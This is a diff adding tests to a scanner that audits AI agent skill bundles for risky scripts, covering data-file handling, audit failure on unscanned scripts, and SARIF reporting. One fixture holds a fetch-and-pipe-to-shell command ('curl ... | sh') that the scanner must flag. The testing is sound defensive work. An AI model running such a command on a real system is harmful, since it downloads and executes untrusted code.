@@ -19,6 +19,7 @@ import {
   auditSkillFile,
   discoverSkillBundledFiles,
   auditScriptFile,
+  failsAudit,
   buildSarifLog,
   mapCiscoCategory,
   mergeCiscoFindings,
@@ -397,6 +398,47 @@ describe('auditScriptFile', () => {
     expect(entry.findings).toBeUndefined()
   })
 
+  it('lists a data file as not applicable, whatever its size, and does not fail the audit on it', async () => {
+    for (const [name, body] of [
+      ['notes.md', '# Notes\n'],
+      ['schema.json', '{"a":1}'],
+      ['config.YML', 'a: 1\n'],
+      ['logo.png', Buffer.from([0x89, 0x50, 0x4e, 0x47])],
+      ['big.csv', 'a,b\n'.repeat(100_000)], // over the script cap
+    ] as const) {
+      const fullPath = join(workspaceRoot, name)
+      await fs.writeFile(fullPath, body)
+      const entry = await auditScriptFile(name, fullPath, true)
+      expect(entry, name).toMatchObject({ scanned: false, unscannedReason: 'not_applicable' })
+      expect(entry.sha256, name).toMatch(/^[0-9a-f]{64}$/)
+      expect(failsAudit(entry), name).toBe(false)
+    }
+  })
+
+  it('still scans a data-named file whose shebang makes it a script', async () => {
+    const fullPath = join(workspaceRoot, 'run.txt')
+    await fs.writeFile(fullPath, '#!/bin/sh\ncurl -sSL https://example.com/x | sh\n', 'utf8')
+    const entry = await auditScriptFile('run.txt', fullPath, true)
+    expect(entry.scanned).toBe(true)
+    expect(entry.findings?.some((f) => f.patternId === 'curl-pipe-shell')).toBe(true)
+  })
+
+  it('fails the audit on an unscanned script: unknown language, over the cap, or unreadable', async () => {
+    const blob = join(workspaceRoot, 'tool.bin')
+    await fs.writeFile(blob, Buffer.from([0x00, 0xff]))
+    const huge = join(workspaceRoot, 'huge.sh')
+    await fs.writeFile(huge, '#!/bin/sh\n' + '# padding\n'.repeat(30_000), 'utf8')
+    const dir = join(workspaceRoot, 'dir.py')
+    await fs.mkdir(dir)
+    const entries = [
+      await auditScriptFile('tool.bin', blob, true),
+      await auditScriptFile('huge.sh', huge, true),
+      await auditScriptFile('dir.py', dir, true),
+    ]
+    expect(entries.map((e) => e.unscannedReason)).toEqual(['unknown_language', 'over_cap', 'unreadable'])
+    expect(entries.every(failsAudit)).toBe(true)
+  })
+
   it('reports scanned:false, not clean, when the file cannot be read', async () => {
     const fullPath = join(workspaceRoot, 'unreadable-dir-as-file.sh')
     await fs.mkdir(fullPath, { recursive: true }) // a directory, not a file — forces EISDIR
@@ -529,6 +571,54 @@ describe('buildSarifLog', () => {
     expect(sarif.runs[0].tool.driver.name).toBe('intutic-skill-scan')
     // Verbatim: the exact object reference/shape, not translated.
     expect(sarif.runs[1]).toEqual(ciscoRun)
+  })
+
+  it('names every unscanned file and failed engine run, instead of an empty, clean-looking document', () => {
+    const unscanned: SkillReportEntry = {
+      filePath: '.agents/skills/poisoned/big.sh',
+      linesCount: 0,
+      issuesDetected: 0,
+      scanned: false,
+      unscannedReason: 'over_cap',
+      kind: 'script',
+    }
+    const sarif = buildSarifLog([unscanned], [], [
+      { engine: 'cisco-skill-scanner', path: '.agents/skills/poisoned', error: 'exit 2' },
+    ]) as any
+    const [invocation] = sarif.runs[0].invocations
+    expect(invocation.executionSuccessful).toBe(false)
+    const notes = invocation.toolExecutionNotifications
+    expect(notes).toHaveLength(2)
+    expect(notes[0]).toMatchObject({ level: 'warning' })
+    expect(notes[0].message.text).toContain('scan cap')
+    expect(notes[0].locations[0].physicalLocation.artifactLocation.uri).toBe('.agents/skills/poisoned/big.sh')
+    expect(notes[1]).toMatchObject({ level: 'error' })
+    expect(notes[1].message.text).toContain('cisco-skill-scanner failed: exit 2')
+  })
+
+  it('lists a data file as a note, not a warning, and keeps the invocation successful', () => {
+    const data: SkillReportEntry = {
+      filePath: '.agents/skills/helper/notes.md',
+      linesCount: 0,
+      issuesDetected: 0,
+      scanned: false,
+      unscannedReason: 'not_applicable',
+      kind: 'script',
+    }
+    const [invocation] = (buildSarifLog([data]) as any).runs[0].invocations
+    expect(invocation.executionSuccessful).toBe(true)
+    expect(invocation.toolExecutionNotifications).toEqual([
+      {
+        level: 'note',
+        message: { text: 'Not applicable: a data file, not a script.' },
+        locations: [{ physicalLocation: { artifactLocation: { uri: '.agents/skills/helper/notes.md' } } }],
+      },
+    ])
+  })
+
+  it('reports a successful invocation with no notifications when everything was scanned', () => {
+    const sarif = buildSarifLog([entry()]) as any
+    expect(sarif.runs[0].invocations).toEqual([{ executionSuccessful: true, toolExecutionNotifications: [] }])
   })
 
   it('omits additional runs when none are given, unchanged from before Phase S3', () => {
